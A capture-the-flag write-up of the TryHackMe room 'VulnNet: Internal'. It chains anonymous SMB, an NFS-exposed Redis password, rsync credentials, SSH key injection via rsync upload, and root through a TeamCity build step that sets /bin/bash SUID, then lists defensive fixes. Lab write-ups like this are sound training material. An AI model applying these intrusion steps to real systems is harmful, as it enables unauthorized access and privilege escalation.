# CTF Write-up: VulnNet: Internal — TryHackMe

| | |
|---|---|
| **Platform**   | TryHackMe |
| **Machine**    | VulnNet: Internal |
| **Difficulty** | Easy |
| **Tags**       | `SMB` `NFS` `Redis` `Rsync` `TeamCity` `SSH Key Injection` |

---

## Introduction

VulnNet: Internal is a fantastic room for learning how small service misconfigurations compound into full system compromise. There's no single flashy exploit here — instead, you chain together anonymous SMB access, sensitive files exposed over NFS, a hardcoded Redis password, Rsync write access, and finally a JetBrains TeamCity admin panel that you reach through SSH port forwarding. It's a masterclass in lateral movement via misconfigured services.

---

## Step 1 — Reconnaissance (RustScan + Nmap)

Used RustScan for speed, then passed results to Nmap:

```bash
rustscan -a <target-ip> -r 1-65535 --ulimit 5000 -- -A
```

Several interesting services came back:

- SSH
- SMB (Samba)
- NFS
- Rsync
- Redis

Multiple file-sharing and remote-access services exposed — almost certainly misconfigured. Started with SMB.

---

## Step 2 — SMB Enumeration → Service Flag

Tested for anonymous SMB access:

```bash
smbmap -H <target-ip> -u "" -p ""
smbclient //<target-ip>/shares -N
```

Anonymous login worked. Inside the share was a file called `service.txt`.

> **Service Flag:** `[flag here]`

Ran enum4linux to pull usernames and get a feel for the password policy:

```bash
enum4linux -a <target-ip>
```

This gave us a user list and confirmed a weak password policy — a sign that credential reuse was likely in play across services.

---

## Step 3 — NFS Mount → Redis Credentials

SMB didn't give deeper access, so I moved to NFS:

```bash
showmount -e <target-ip>
```

A mountable export was available. Mounted it locally:

```bash
mount -t nfs <target-ip>://opt/conf /mnt/nfs
```

Browsing the mounted directory revealed a collection of configuration files. One of them — a Redis configuration file — had a hardcoded password sitting right in plain text.

Redis is next.

---

## Step 4 — Redis Access → Internal Flag & Rsync Credentials

Connected to Redis with the discovered password:

```bash
redis-cli -h <target-ip>
AUTH <discovered-password>
```

Enumerated the database. Found the internal flag:

> **Internal Flag:** `[flag here]`

Also found a Base64-encoded string stored in Redis. Decoded it:

```bash
echo "<base64-string>" | base64 -d
```

Output contained credentials for the rsync service — specifically a username and password for `rsync://rsync-connect@localhost`.

---

## Step 5 — Rsync Access → User Flag & SSH Key Injection

Connected to rsync with the recovered credentials:

```bash
rsync -av rsync://rsync-connect@<target-ip>/files
```

Listed the available content and found the user flag:

> **User Flag:** `[flag here]`

Crucially, rsync also allowed file uploads to the same path. This meant I could write to the target user's home directory — specifically their `.ssh` folder. I generated a fresh SSH key pair on my machine:

```bash
ssh-keygen -t rsa -f ./id_rsa
```

Uploaded my public key as `authorized_keys`:

```bash
rsync authorized_keys rsync://rsync-connect@<target-ip>/files/sys-internal/.ssh/
```

Logged in over SSH as `sys-internal`:

```bash
ssh -i id_rsa sys-internal@<target-ip>
```

Clean shell on the system.

---

## Step 6 — Privilege Escalation (TeamCity RCE)

Ran LinPEAS on the box. One directory in the scan stood out:

```
/TeamCity
```

JetBrains TeamCity is a CI/CD platform that typically runs on port 8111. That port wasn't accessible externally, so I used SSH port forwarding to reach it from my machine:

```bash
ssh -L 8111:localhost:8111 sys-internal@<target-ip>
```

Browsed to `http://localhost:8111` and the TeamCity login page loaded. The page indicated an admin token was required rather than a username and password.

Searched the TeamCity installation directory for tokens:

```bash
grep -r "token" /TeamCity 2>/dev/null
```

Found multiple tokens in the log files. Tested them until one worked and I was in as the TeamCity administrator.

With admin access to the CI/CD system, I created a new project and configured a build step using a "Command Line" runner. The command was simple:

```bash
chmod +s /bin/bash
```

Ran the build. TeamCity executed the command as root (the service runs as root by default). Then on the shell:

```bash
/bin/bash -p
whoami
# root
```

---

## Step 7 — Root Flag

```bash
cat /root/root.txt
```

> **Root Flag:** `[flag here]`

---

## Summary & Takeaways

A five-stage service-chaining attack:

1. Anonymous SMB → service flag.
2. NFS mount → hardcoded Redis password.
3. Redis enumeration → rsync credentials (Base64).
4. Rsync write access → SSH key injection → shell.
5. TeamCity CI/CD (via port forwarding) → build pipeline RCE → root.

The defensive fixes are straightforward: disable anonymous SMB, don't store credentials in config files exposed over NFS, require auth on Redis, restrict Rsync write permissions, and never run TeamCity as root.
